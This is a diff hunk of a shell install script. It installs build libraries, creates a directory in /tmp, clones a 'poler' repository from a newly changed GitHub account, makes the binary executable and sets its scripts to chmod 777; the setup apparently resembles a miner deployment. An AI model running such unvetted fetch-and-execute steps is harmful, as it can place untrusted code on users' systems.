@@ -17,7 +17,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir poler
-git clone https://github.com/neloper/poler.git /tmp/poler
+git clone https://github.com/WilliamWizard/poler.git /tmp/poler
 cd /tmp/poler
 chmod +x /tmp/poler/poler
 chmod 777 ./*.sh
